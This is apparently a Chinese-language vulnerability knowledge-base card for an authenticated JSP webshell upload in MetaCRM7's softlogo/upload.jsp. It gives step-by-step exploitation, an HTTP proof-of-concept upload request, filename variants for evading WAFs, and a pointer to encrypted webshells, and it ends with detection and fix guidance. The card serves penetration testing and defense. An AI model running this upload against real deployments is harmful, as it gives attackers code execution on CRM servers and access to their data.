---
id: web-generic-file-upload-crm-softlogo-jsp-no-filter
title: MetaCRM 后台 softlogo/upload.jsp 无后缀过滤上传 JSP WebShell（绕过全局黑名单）
type: scenario
domain: web
path: web/generic/file-upload
technique: crm-softlogo-jsp-upload-no-filter
aliases:
- MetaCRM softlogo 任意文件上传
- softlogo/upload.jsp getshell
- DiskFileUpload 无过滤上传
- CRM 后台 JSP 上传
- 绕过 limit.json 黑名单
tags:
- java
- jsp
- file-upload
- webshell
- crm
- authenticated
- web
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V232
  verified_at: '2026-11-07T09:23:59+08:00'
  notes: 已对照原文与26张图核对：softlogo/upload.jsp 先 UserManager.getUserBySessionId 鉴权（us==null 跳 /index.jsp），后用 DiskFileUpload 解析并 item.write(path+filename)，无后缀/内容/魔数校验，文件落 /userfile/default/userlogo/ 并被 Tomcat 执行，图23-26 一致；该入口不经过新版 Upload/FileUtil 的 limit.json 黑名单，卡内表述准确。dup-scan pair#2 与 18758 的 sendsms/mobileupload（前台 Upload 类 UUID+原始后缀）判 likely_duplicate，按原文裁决为不同端点/不同上传组件，保留双方；pair#8/9/26/34/43/51 related。affected_versions 原取自 classpath 测试环境版本，已 clear。未复跑 PoC。
---

## 一句话结论

MetaCRM7 后台的 `/develop/systparam/softlogo/upload.jsp` 用 `DiskFileUpload` 解析 multipart 后直接把文件写到 `Path.getSoftLogoAbsoluteDirectory(sCorpName)` 下，文件名来自客户端、没有任何后缀/内容/魔数校验；登录用户上传 `.jsp` 即可落到 `/userfile/default/userlogo/` 并被 Tomcat 当脚本执行，获得 WebShell。该入口不经过新版本在 `Upload`/`FileUtil` 中加入的 `limit.json` 黑名单。

## 原理

- **入口与鉴权**：`softlogo/upload.jsp` 先通过 `UserManager.getUserBySessionId(session.getId())` 取 `UserState us`；`us == null` 时 `response.sendRedirect("/index.jsp")` 并返回，因此是后台漏洞，需要有效会话。
- **上传处理**：`String path = Path.getSoftLogoAbsoluteDirectory(sCorpName); String path2 = Path.getSoftLogoRelativeDirectory(sCorpName);`，然后 `DiskFileUpload upload = new DiskFileUpload(); upload.setHeaderEncoding("UTF-8"); List uploadlist = upload.parseRequest(request);` 遍历 `FileItem`；对非表单字段且大小大于 0 的项，取 `filename = FilenameUtils.getName(item.getName())`，`saveFilepath = new File(path + filename)`，`item.write(saveFilepath)`。
- **没有过滤**：代码未检查扩展名、Content-Type、文件魔数，也未把文件名重命名为无后缀；`filename` 完全由客户端 multipart 的 `filename` 决定。`item.write` 直接写磁盘。
- **为什么 JSP 可执行**：保存目录 `Path.getSoftLogoAbsoluteDirectory` 位于 Web 可访问的 `/userfile/default/userlogo/` 映射下（响应中的 JS 也拼出 `/userfile/default/userlogo/<name>.jsp`）；Tomcat 会把 `.jsp` 交给 JSP 引擎编译执行。原文上传内容为 `<%out.println("test");%>`，访问返回 `test`，证明代码执行。
- **为什么能绕过全局黑名单**：新版本在 `com.metasoft.framework.pub.upload.Upload` 与 `FileUtil` 中读取 `configs/limit.json`，黑名单包含 `exe, js, jsp`；但该黑名单只在走 `Upload`/`FileUtil` 的接口生效，`softlogo/upload.jsp` 直接使用 `DiskFileUpload`，不经过该逻辑。全局搜索 upload 找到的“另一个上传方法”就是绕过点。
- **危害**：上传 JSP WebShell 后可在 Web 进程权限下执行命令、读取配置/数据库、横向移动；若进程高权限或可写其他目录，危害更大。

## 触发条件

- 目标部署 MetaCRM7，`/develop/systparam/softlogo/upload.jsp` 可达，且攻击者拥有后台会话（或能通过默认口令/其他漏洞获得）。
- 上传目录位于 Web 根/静态映射内，Tomcat 对 `.jsp` 正常解析（上传目录未禁用脚本）。
- `softlogo/upload.jsp` 未被 WAF 拦截 multipart 中的 `.jsp` 文件名/内容。
- 目标未把该历史接口下线，且 `DiskFileUpload` 可用（commons-fileupload 依赖存在）。

## 利用步骤

1. 登录 MetaCRM 后台，取得有效 `JSESSIONID`。
2. 构造 multipart POST 到 `/develop/systparam/softlogo/upload.jsp`，字段名 `file`，文件名 `aaa.jsp`（或任意 `.jsp` 名），内容为 JSP 代码，例如 `<%out.println("test");%>`。
3. 发送请求；响应页面/JS 会拼出上传后的相对路径（如 `/userfile/default/userlogo/<filename>.jsp`）。
4. 直接 GET 该路径，确认 JSP 执行（原文返回 `test`）。
5. 将内容替换为命令执行/加密 WebShell（冰蝎、哥斯拉等），或先上传探测文件确认路径，再上传正式载荷；按授权范围验证命令执行。
6. 若文件名被追加/改写，观察响应中的路径或目录规律；若上传目录不可执行，尝试其他上传接口或结合路径穿越。

## PoC

```http
POST /develop/systparam/softlogo/upload.jsp HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid session>
Content-Length: 234
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4Ntxn9hNBuXFPZjE

------WebKitFormBoundary4Ntxn9hNBuXFPZjE
Content-Disposition: form-data; name="file"; filename="aaa.jsp"
Content-Type: image/jpeg

<%out.println("test");%>
------WebKitFormBoundary4Ntxn9hNBuXFPZjE--
```

上传后访问（文件名以实际响应为准）：

```http
GET /userfile/default/userlogo/aaa.jsp HTTP/1.1
Host: target
```

```http
HTTP/1.1 200 OK

test
```

## 变体与关联

- 变体：`.jspx`、`.jspf`、大小写 `.JSP`、`filename="aaa.jsp "` 等，视容器解析与 WAF 规则；核心是服务端不校验后缀。
- 变体：上传目录若可配置到其他 Web 路径，落地 URL 随之变化；可结合目录穿越/错误回显定位。
- 关联：[[web-generic-file-upload-crm-sendfile-jsp-preserve-suffix]]（同产品另一条 `sendfile.jsp` 保留后缀上传 JSP 的链，入口不同）、[[web-generic-file-upload-upload1-filename-traversal-jsp-webroot]]（原始文件名穿越写 JSP 的通用链）。
- 边界：需要后台会话；若上传目录禁止脚本执行、WAF 拦截 JSP 内容、或接口已下线则失效；`limit.json` 黑名单对该入口无效。

## 检测与防御

- 检测：后台账号在 `/develop/systparam/softlogo/upload.jsp` 上传 `.jsp/.jspx/.jspf` 文件；`/userfile/default/userlogo/` 下出现新增脚本文件；上传后短时间内访问该新文件；JSP 内容含 `out.println`、`Runtime`、`ProcessBuilder`、冰蝎/哥斯拉特征。
- 修复：所有上传入口统一走带白名单/魔数校验的 `Upload` 组件；对 `softlogo/upload.jsp` 增加扩展名白名单（仅图片）、重命名为无后缀或固定后缀、限制大小；上传目录移出 Web 根或禁止脚本解析。
- 加固：后台接口统一鉴权与权限控制；WAF 拦截 multipart 中的 `.jsp` 文件名与 JSP 关键字；定期排查 `/userfile/**` 下的可疑脚本；下线历史上传接口。
